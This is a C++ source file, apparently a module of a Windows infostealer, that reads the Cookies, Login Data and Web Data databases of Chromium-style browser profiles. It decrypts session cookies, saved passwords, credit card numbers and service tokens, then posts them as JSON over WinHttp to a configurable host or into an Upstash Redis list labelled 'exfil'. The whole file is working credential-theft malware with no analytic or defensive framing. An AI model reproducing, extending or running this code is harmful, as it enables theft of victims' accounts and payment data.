#include "data_extractor.hpp"
#include "handle_duplicator.hpp"
#include "../crypto/aes_gcm.hpp"
#include <sstream>
#include <iomanip>

namespace Payload {

    DataExtractor::DataExtractor(PipeClient& pipe, const std::vector<uint8_t>& key, const std::wstring& targetHost, const std::wstring& endpoint, const std::wstring& authToken, bool upstash)
        : m_pipe(pipe), m_key(key), m_targetHost(targetHost), m_endpoint(endpoint), m_authToken(authToken), m_upstash(upstash) {}

    std::string DataExtractor::EscapeJson(const std::string& s) {
        std::string out;
        out.reserve(s.size());
        for (unsigned char c : s) {
            switch (c) {
                case '"':  out += "\\\""; break;
                case '\\': out += "\\\\"; break;
                case '\n': out += "\\n";  break;
                case '\r': out += "\\r";  break;
                case '\t': out += "\\t";  break;
                default:
                    if (c < 0x20) { char buf[8]; snprintf(buf, sizeof(buf), "\\u%04x", c); out += buf; }
                    else out += c;
            }
        }
        return out;
    }

    void DataExtractor::TransmitViaCOM(const std::string& data) {
        if (data.empty()) return;

        // Upstash Redis REST pipeline: [["LPUSH","exfil","<data>"]]
        std::string body = m_upstash
            ? "[[\"LPUSH\",\"exfil\",\"" + EscapeJson(data) + "\"]]"
            : data;

        HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
        bool uninit = (hr == S_OK || hr == S_FALSE);

        CLSID clsid;
        if (FAILED(CLSIDFromProgID(L"WinHttp.WinHttpRequest.5.1", &clsid))) {
            if (uninit) CoUninitialize();
            return;
        }

        IDispatch* pReq = nullptr;
        if (FAILED(CoCreateInstance(clsid, NULL, CLSCTX_INPROC_SERVER, IID_IDispatch, (void**)&pReq))) {
            if (uninit) CoUninitialize();
            return;
        }

        auto GetID = [&](const wchar_t* name, DISPID& id) -> bool {
            OLECHAR* n = (OLECHAR*)name;
            return SUCCEEDED(pReq->GetIDsOfNames(IID_NULL, &n, 1, LOCALE_USER_DEFAULT, &id));
        };

        auto SetHeader = [&](DISPID idSetHeader, const wchar_t* name, const wchar_t* val) {
            _bstr_t n = name, v = val;
            VARIANT args[2];
            VariantInit(&args[0]); args[0].vt = VT_BSTR; args[0].bstrVal = v.copy();
            VariantInit(&args[1]); args[1].vt = VT_BSTR; args[1].bstrVal = n.copy();
            DISPPARAMS dp = { args, NULL, 2, 0 };
            pReq->Invoke(idSetHeader, IID_NULL, LOCALE_USER_DEFAULT, DISPATCH_METHOD, &dp, NULL, NULL, NULL);
        };

        DISPID idOpen, idSetHeader, idSend;
        if (!GetID(L"Open", idOpen) || !GetID(L"SetRequestHeader", idSetHeader) || !GetID(L"Send", idSend)) {
            pReq->Release();
            if (uninit) CoUninitialize();
            return;
        }

        // Open(method, url, async=false) — DISPPARAMS args are in reverse order
        _bstr_t url  = (L"https://" + m_targetHost + m_endpoint).c_str();
        _bstr_t meth = L"POST";
        VARIANT openArgs[3];
        VariantInit(&openArgs[0]); openArgs[0].vt = VT_BOOL; openArgs[0].boolVal = VARIANT_FALSE;
        VariantInit(&openArgs[1]); openArgs[1].vt = VT_BSTR; openArgs[1].bstrVal = url.copy();
        VariantInit(&openArgs[2]); openArgs[2].vt = VT_BSTR; openArgs[2].bstrVal = meth.copy();
        DISPPARAMS dpOpen = { openArgs, NULL, 3, 0 };
        pReq->Invoke(idOpen, IID_NULL, LOCALE_USER_DEFAULT, DISPATCH_METHOD, &dpOpen, NULL, NULL, NULL);

        SetHeader(idSetHeader, L"Content-Type", L"application/json");

        if (!m_authToken.empty()) {
            std::wstring bearerVal = L"Bearer " + m_authToken;
            SetHeader(idSetHeader, L"Authorization", bearerVal.c_str());
        }

        // Send(body)
        _bstr_t bstrBody = body.c_str();
        VARIANT sendArg;
        VariantInit(&sendArg); sendArg.vt = VT_BSTR; sendArg.bstrVal = bstrBody.copy();
        DISPPARAMS dpSend = { &sendArg, NULL, 1, 0 };
        pReq->Invoke(idSend, IID_NULL, LOCALE_USER_DEFAULT, DISPATCH_METHOD, &dpSend, NULL, NULL, NULL);

        pReq->Release();
        if (uninit) CoUninitialize();
    }

    sqlite3* DataExtractor::OpenDatabase(const std::filesystem::path& dbPath) {
        sqlite3* db = nullptr;
        sqlite3_open16(dbPath.c_str(), &db);
        return db;
    }

    sqlite3* DataExtractor::OpenDatabaseWithHandleDuplication(const std::filesystem::path& dbPath) {
        auto dupPath = HandleDuplicator::Duplicate(dbPath);
        if (!dupPath) return nullptr;
        m_tempFiles.push_back(*dupPath);
        return OpenDatabase(*dupPath);
    }

    void DataExtractor::CleanupTempFiles() {
        for (auto& p : m_tempFiles)
            DeleteFileW(p.c_str());
        m_tempFiles.clear();
    }

    void DataExtractor::ExtractCookies(sqlite3* db) {
        sqlite3_stmt* stmt;
        if (sqlite3_prepare_v2(db, "SELECT host_key,name,path,encrypted_value,expires_utc,is_secure FROM cookies", -1, &stmt, NULL) != SQLITE_OK) return;

        std::string json = "[";
        bool first = true;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const void* blob = sqlite3_column_blob(stmt, 3);
            int len = sqlite3_column_bytes(stmt, 3);
            auto dec = Crypto::AesGcm::Decrypt(m_key, std::vector<uint8_t>((uint8_t*)blob, (uint8_t*)blob + len));
            if (!dec) continue;
            if (!first) json += ",";
            first = false;
            json += "{\"host\":\"" + EscapeJson((const char*)sqlite3_column_text(stmt, 0)) + "\","
                     "\"name\":\"" + EscapeJson((const char*)sqlite3_column_text(stmt, 1)) + "\","
                     "\"path\":\"" + EscapeJson((const char*)sqlite3_column_text(stmt, 2)) + "\","
                     "\"value\":\"" + EscapeJson(std::string((char*)dec->data(), dec->size())) + "\","
                     "\"expires\":" + std::to_string(sqlite3_column_int64(stmt, 4)) + ","
                     "\"secure\":"  + (sqlite3_column_int(stmt, 5) ? "true" : "false") + "}";
        }
        sqlite3_finalize(stmt);
        json += "]";
        if (!first) TransmitViaCOM("{\"type\":\"cookies\",\"data\":" + json + "}");
    }

    void DataExtractor::ExtractPasswords(sqlite3* db) {
        sqlite3_stmt* stmt;
        if (sqlite3_prepare_v2(db, "SELECT origin_url,username_value,password_value FROM logins", -1, &stmt, NULL) != SQLITE_OK) return;

        std::string json = "[";
        bool first = true;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const void* blob = sqlite3_column_blob(stmt, 2);
            int len = sqlite3_column_bytes(stmt, 2);
            auto dec = Crypto::AesGcm::Decrypt(m_key, std::vector<uint8_t>((uint8_t*)blob, (uint8_t*)blob + len));
            if (!dec) continue;
            if (!first) json += ",";
            first = false;
            json += "{\"url\":\"" + EscapeJson((const char*)sqlite3_column_text(stmt, 0)) + "\","
                     "\"username\":\"" + EscapeJson((const char*)sqlite3_column_text(stmt, 1)) + "\","
                     "\"password\":\"" + EscapeJson(std::string((char*)dec->data(), dec->size())) + "\"}";
        }
        sqlite3_finalize(stmt);
        json += "]";
        if (!first) TransmitViaCOM("{\"type\":\"passwords\",\"data\":" + json + "}");
    }

    void DataExtractor::ExtractCards(sqlite3* db) {
        sqlite3_stmt* stmt;
        if (sqlite3_prepare_v2(db, "SELECT name_on_card,expiration_month,expiration_year,card_number_encrypted FROM credit_cards", -1, &stmt, NULL) != SQLITE_OK) return;

        std::string json = "[";
        bool first = true;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const void* blob = sqlite3_column_blob(stmt, 3);
            int len = sqlite3_column_bytes(stmt, 3);
            auto dec = Crypto::AesGcm::Decrypt(m_key, std::vector<uint8_t>((uint8_t*)blob, (uint8_t*)blob + len));
            if (!dec) continue;
            if (!first) json += ",";
            first = false;
            json += "{\"name\":\"" + EscapeJson((const char*)sqlite3_column_text(stmt, 0)) + "\","
                     "\"month\":"  + std::to_string(sqlite3_column_int(stmt, 1)) + ","
                     "\"year\":"   + std::to_string(sqlite3_column_int(stmt, 2)) + ","
                     "\"number\":\"" + EscapeJson(std::string((char*)dec->data(), dec->size())) + "\"}";
        }
        sqlite3_finalize(stmt);
        json += "]";
        if (!first) TransmitViaCOM("{\"type\":\"cards\",\"data\":" + json + "}");
    }

    void DataExtractor::ExtractTokens(sqlite3* db) {
        sqlite3_stmt* stmt;
        if (sqlite3_prepare_v2(db, "SELECT service,encrypted_token FROM token_service", -1, &stmt, NULL) != SQLITE_OK) return;

        std::string json = "[";
        bool first = true;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const void* blob = sqlite3_column_blob(stmt, 1);
            int len = sqlite3_column_bytes(stmt, 1);
            auto dec = Crypto::AesGcm::Decrypt(m_key, std::vector<uint8_t>((uint8_t*)blob, (uint8_t*)blob + len));
            if (!dec) continue;
            if (!first) json += ",";
            first = false;
            json += "{\"service\":\"" + EscapeJson((const char*)sqlite3_column_text(stmt, 0)) + "\","
                     "\"token\":\"" + EscapeJson(std::string((char*)dec->data(), dec->size())) + "\"}";
        }
        sqlite3_finalize(stmt);
        json += "]";
        if (!first) TransmitViaCOM("{\"type\":\"tokens\",\"data\":" + json + "}");
    }

    void DataExtractor::ProcessProfile(const std::filesystem::path& profilePath, const std::string& browserName) {
        struct { const wchar_t* file; void (DataExtractor::*fn)(sqlite3*); } dbs[] = {
            { L"Cookies",    &DataExtractor::ExtractCookies   },
            { L"Login Data", &DataExtractor::ExtractPasswords },
            { L"Web Data",   &DataExtractor::ExtractCards     },
            { L"Web Data",   &DataExtractor::ExtractTokens    },
        };

        for (auto& entry : dbs) {
            auto dbPath = profilePath / entry.file;
            if (!std::filesystem::exists(dbPath)) continue;
            sqlite3* db = OpenDatabaseWithHandleDuplication(dbPath);
            if (!db) db = OpenDatabase(dbPath);
            if (!db) continue;
            (this->*entry.fn)(db);
            sqlite3_close(db);
        }

        CleanupTempFiles();
    }

}
